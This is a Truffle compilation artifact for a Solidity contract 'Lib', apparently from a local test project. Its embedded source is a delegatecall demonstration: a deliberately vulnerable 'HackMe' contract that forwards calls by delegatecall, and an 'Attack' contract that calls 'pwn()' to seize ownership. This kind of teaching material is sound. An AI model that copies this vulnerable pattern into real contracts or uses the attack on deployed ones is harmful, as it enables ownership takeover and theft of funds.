{
  "contractName": "Lib",
  "abi": [
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "pwn",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5061015b806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80638da5cb5b1461003b578063dd365b8b14610059575b600080fd5b610043610063565b604051610050919061010a565b60405180910390f35b610061610087565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100f4826100c9565b9050919050565b610104816100e9565b82525050565b600060208201905061011f60008301846100fb565b9291505056fea26469706673582212203f1fa26f0c65cd0388118e645fcb872df54c9eceade9918fe05a3fa803775acb64736f6c634300080b0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.11;\n\ncontract Lib {\n    address public owner;\n\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n\ncontract HackMe {\n    address public owner;\n    Lib public lib;\n\n    constructor(Lib _lib) {\n        owner = msg.sender;\n        lib = Lib(_lib);\n    }\n\n    fallback() external payable {\n        address(lib).delegatecall(msg.data);\n    }\n}\n\ncontract Attack {\n    address public hackMe;\n\n    constructor(address _hackMe) {\n        hackMe = _hackMe;\n    }\n\n    function attack() public {\n        hackMe.call(abi.encodeWithSignature(\"pwn()\"));\n    }\n}\n",
  "sourcePath": "/home/shenjun/Desktop/tools/finance/truffle_test1/contracts/Delegatecall.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-06-03T07:47:34.016Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}